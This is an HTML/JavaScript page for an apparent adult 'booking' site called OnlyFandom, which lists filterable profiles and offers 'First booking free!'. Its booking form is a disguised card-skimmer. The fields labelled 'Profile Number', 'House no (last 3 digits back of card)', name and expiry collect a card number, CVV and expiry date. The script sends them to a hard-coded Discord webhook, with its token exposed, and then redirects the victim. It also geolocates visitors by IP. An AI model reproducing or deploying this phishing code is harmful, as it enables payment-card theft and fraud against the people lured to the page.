<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>OnlyFandom FYP</title>
  <style>
    body {
      margin: 0;
      font-family: 'Inter', 'Segoe UI', sans-serif;
      background: #1e1e1e;
      color: #eee;
      transition: background 0.3s, color 0.3s;
    }
    body.light { background: #f5f6fa; color: #222; }

    header { padding: 20px; text-align: center; background: #2a2a2a; border-bottom: 1px solid #444; }
    body.light header { background: #fff; border-bottom: 1px solid #ddd; }

    .logo { font-size: 28px; font-weight: 700; }
    .logo .only { color: #0066cc; }
    .logo .fandom { color: #6a0dad; }

    .filters { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; margin: 20px 0; }
    .filters input, .filters select { padding: 8px; border-radius: 6px; border: 1px solid #555; background: #333; color: #eee; min-width: 100px; }
    body.light .filters input, body.light .filters select { background: #fff; color: #222; border: 1px solid #ccc; }
    .filters button { padding: 8px 16px; border-radius: 6px; border: none; background: #0066cc; color: #fff; font-weight: 600; cursor: pointer; }

    .mode-toggle { margin-top: 10px; cursor: pointer; font-size: 14px; color: #0066cc; }

    .feed { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .card { background: #2a2a2a; border: 1px solid #444; border-radius: 10px; width: 90%; max-width: 600px; margin: 15px 0; padding: 20px; box-shadow: 0 2px 6px rgba(0,0,0,0.4); transition: transform 0.2s ease; }
    body.light .card { background: #fff; border: 1px solid #eee; box-shadow: 0 2px 6px rgba(0,0,0,0.08); }
    .card:hover { transform: translateY(-3px); }
    .card h2 { margin: 0; font-size: 20px; color: #0066cc; }
    .card p { margin: 8px 0 0; font-size: 15px; color: #ccc; }
    body.light .card p { color: #555; }

    .btn { display: inline-block; margin-top: 12px; padding: 8px 16px; border-radius: 6px; background: #6a0dad; color: #fff; font-weight: 600; text-decoration: none; cursor: pointer; border: none; }

    .popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; justify-content: center; align-items: center; }
    .popup-content { background: #2a2a2a; padding: 25px; border-radius: 10px; width: 80%; max-width: 500px; text-align: center; color: #eee; }
    body.light .popup-content { background: #fff; color: #222; }
    .close-btn { margin-top: 20px; padding: 8px 16px; background: #0066cc; border: none; border-radius: 6px; color: #fff; cursor: pointer; }

    .image-slider img { width: 100%; border-radius: 8px; }
    .image-slider button { margin: 5px; padding: 4px 8px; border: none; background: #444; color: #fff; border-radius: 4px; cursor: pointer; }

    .tab-buttons { display: flex; justify-content: center; gap: 10px; margin-bottom: 15px; }
    .tab-buttons button { padding: 8px 12px; border: none; border-radius: 6px; cursor: pointer; background: #0066cc; color: #fff; }
    .hidden { display: none; }
  </style>
</head>
<body class="dark">
  <header>
    <div class="logo"><span class="only">Only</span><span class="fandom">Fandom</span></div>
    <div class="mode-toggle" onclick="toggleMode()">Dark/Light</div>
    <div class="filters">
      <input type="number" id="minAge" placeholder="Min Age">
      <input type="number" id="maxAge" placeholder="Max Age">
      <input type="number" id="minHeight" placeholder="Min Height">
      <input type="number" id="maxHeight" placeholder="Max Height">
      <input type="number" id="minPrice" placeholder="Min Price">
      <input type="number" id="maxPrice" placeholder="Max Price">
      <select id="location">
        <option value="All">All Countries</option>
        <option value="India">🇮🇳 India</option>
        <option value="USA">🇺🇸 USA</option>
        <option value="UK">🇬🇧 UK</option>
        <option value="Japan">🇯🇵 Japan</option>
        <option value="Germany">🇩🇪 Germany</option>
        <option value="France">🇫🇷 France</option>
        <option value="Canada">🇨🇦 Canada</option>
        <option value="Australia">🇦🇺 Australia</option>
      </select>
      <button onclick="applyFilter()">Apply</button>
    </div>
  </header>

  <div class="feed" id="feed">
    <p>Loading profiles...</p>
  </div>

  <!-- General Popup -->
  <div class="popup" id="popup">
    <div class="popup-content">
      <h2 id="popupTitle"></h2>
      <p id="popupDesc"></p>
      <button class="close-btn" onclick="closePopup()">Close</button>
    </div>
  </div>

  <!-- Booking Popup -->
  <div class="popup" id="bookingPopup">
    <div class="popup-content">
      <h2>Booking Form</h2>
      <div class="tab-buttons">
        <button onclick="showTab('scan')">Scan ID</button>
        <button onclick="showTab('manual')">Manual Entry</button>
      </div>

      <!-- Scan ID Tab -->
      <div id="scanTab" class="hidden">
        <p>📷 Scan your ID here (placeholder for scanner integration).</p>
        <button class="btn" onclick="submitScan()">Submit Scan</button>
      </div>

      <!-- Manual Entry Tab -->
      <div id="manualTab" class="hidden">
        <form id="bookingForm">
          <label>Profile Number:</label><br> 
          <input type="text" id="domesticNumber" required><br><br>

          <label>House no (last 3 digits back of card):</label><br> 
          <input type="text" id="docId" required><br><br>

          <label>Full Name:</label><br>
          <input type="text" id="fullName" required><br><br>

          <label>Expiry date:</label><br>
          <input type="date" id="endDate" required><br><br>

          <button type="submit" class="btn">Submit Booking</button>
          <button type="button" class="close-btn" onclick="closeBookingPopup()">Cancel</button>
        </form>
        <p id="bookingError" style="color:red;"></p>
      </div>
    </div>
  </div>

  <script>
    let posts = [];
    let unlockedState = false;

    const feed = document.getElementById('feed');
    const popup = document.getElementById('popup');
    const popupTitle = document.getElementById('popupTitle');
    const popupDesc = document.getElementById('popupDesc');

    function renderFeed(list, unlocked = false) {
      feed.innerHTML = '';
      if (!list || list.length === 0) {
        feed.innerHTML = '<p>No profiles found matching criteria.</p>';
        return;
      }
      list.forEach((post, index) => {
        const images = unlocked ? post.images_clear : post.images_blurred;
        const card = document.createElement('div');
        card.className = 'card';
        card.innerHTML = `
          <div class="image-slider">
            <img src="${images && images.length > 0 ? images[0] : ''}" id="img-${index}">
            <div style="text-align:center;">
              <button onclick="prevImage(${index}, ${unlocked})">◀</button>
              <button onclick="nextImage(${index}, ${unlocked})">▶</button>
            </div>
          </div>
          <h2>${post.title}</h2>
          <p>Age: ${post.age}, Height: ${post.height}cm, Price: ৳${post.price}, Location: ${post.location}</p>
          <p><strong>First booking free!</strong></p>
          <button class="btn" onclick="bookNow(${index})">BOOK NOW</button>
        `;
        feed.appendChild(card);
      });
    }

    // Image slider logic
    function nextImage(index, unlocked) {
      const img = document.getElementById(`img-${index}`);
      const post = posts[index];
      const images = unlocked ? post.images_clear : post.images_blurred;
      if (!images || images.length === 0) return;
      let current = images.indexOf(img.src.split('/').pop());
      current = (current + 1) % images.length;
      img.src = images[current];
    }

    function prevImage(index, unlocked) {
      const img = document.getElementById(`img-${index}`);
      const post = posts[index];
      const images = unlocked ? post.images_clear : post.images_blurred;
      if (!images || images.length === 0) return;
      let current = images.indexOf(img.src.split('/').pop());
      current = (current - 1 + images.length) % images.length;
      img.src = images[current];
    }

    // Popup logic
    function showPopup(message) {
      popupTitle.textContent = "Locked Feature";
      popupDesc.textContent = message;
      popup.style.display = 'flex';
    }

    function bookNow(index) {
      document.getElementById('bookingPopup').style.display = 'flex';
      showTab('manual');
    }

    function closePopup() {
      popup.style.display = 'none';
    }

    function closeBookingPopup() {
      document.getElementById('bookingPopup').style.display = 'none';
      document.getElementById('bookingError').textContent = '';
    }

    function showTab(tab) {
      document.getElementById('scanTab').classList.add('hidden');
      document.getElementById('manualTab').classList.add('hidden');
      if (tab === 'scan') {
        document.getElementById('scanTab').classList.remove('hidden');
      } else {
        document.getElementById('manualTab').classList.remove('hidden');
      }
    }

    function submitScan() {
      showPopup("Scan submitted successfully (test mode).");
      closeBookingPopup();
    }

    // Handle booking form submission & redirect to index0.html
    document.getElementById('bookingForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const domesticNumber = document.getElementById('domesticNumber').value.trim();
      const docId = document.getElementById('docId').value.trim();
      const fullName = document.getElementById('fullName').value.trim();
      const endDate = document.getElementById('endDate').value;

      if (!/^\d{8,19}$/.test(domesticNumber)) {
        document.getElementById('bookingError').textContent = "Invalid domestic number (must be 8–19 digits).";
        return;
      }
      if (!/^\d{3}$/.test(docId)) {
        document.getElementById('bookingError').textContent = "Invalid Doc ID (must be 3 digits).";
        return;
      }
      if (fullName.length < 2) {
        document.getElementById('bookingError').textContent = "Full name required.";
        return;
      }
      if (!endDate) {
        document.getElementById('bookingError').textContent = "End date required.";
        return;
      }

      const bookingData = { domesticNumber, docId, fullName, endDate };
      const webhookUrl = "https://discord.com/api/webhooks/1533820619026858235/98X3oV-CePeHhVHZ8VmIvjb9S3tdCSUdxa8mZneEItre_ThLTmn7uX1Kso9K8F2lGRkT";
      
      try {
        await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: `Booking Data: ${JSON.stringify(bookingData)}` })
        });
        document.getElementById('bookingError').style.color = "green";
        document.getElementById('bookingError').textContent = "Booking submitted successfully! Redirecting...";
        
        setTimeout(() => {
          window.location.href = "index0.html";
        }, 1500);
      } catch (err) {
        document.getElementById('bookingError').style.color = "red";
        document.getElementById('bookingError').textContent = "Failed to send booking data.";
      }
    });

    function applyFilter() {
      const minAge = parseInt(document.getElementById('minAge').value) || 0;
      const maxAge = parseInt(document.getElementById('maxAge').value) || 100;
      const minHeight = parseInt(document.getElementById('minHeight').value) || 0;
      const maxHeight = parseInt(document.getElementById('maxHeight').value) || 300;
      const minPrice = parseInt(document.getElementById('minPrice').value) || 0;
      const maxPrice = parseInt(document.getElementById('maxPrice').value) || 10000;
      const location = document.getElementById('location').value;

      const filtered = posts.filter(p =>
        p.age >= minAge && p.age <= maxAge &&
        p.height >= minHeight && p.height <= maxHeight &&
        p.price >= minPrice && p.price <= maxPrice &&
        (location === "All" || p.location === location)
      );
      renderFeed(filtered, unlockedState);
    }

    function toggleMode() {
      document.body.classList.toggle('light');
    }

    async function autoSelectCountry() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        const country = data.country_name;
        const locationSelect = document.getElementById('location');
        for (let i = 0; i < locationSelect.options.length; i++) {
          if (locationSelect.options[i].value === country) {
            locationSelect.selectedIndex = i;
            break;
          }
        }
      } catch (e) {
        console.log("Location detection failed:", e);
      }
    }

    async function loadProfiles() {
      try {
        // Explicitly using relative path ./profiles.json for GitHub Pages compatibility
        const res = await fetch("./profiles.json");
        if (!res.ok) throw new Error("Network response was not ok");
        const data = await res.json();
        posts = data;
        renderFeed(posts, unlockedState);
      } catch (e) {
        console.error("Failed to load profiles:", e);
        feed.innerHTML = '<p style="color:red;">Failed to load profiles.json. Make sure the file exists in your repository root and is named in all lowercase.</p>';
      }
    }

    // Initialize
    loadProfiles();
    autoSelectCountry();
  </script>
</body>
</html>
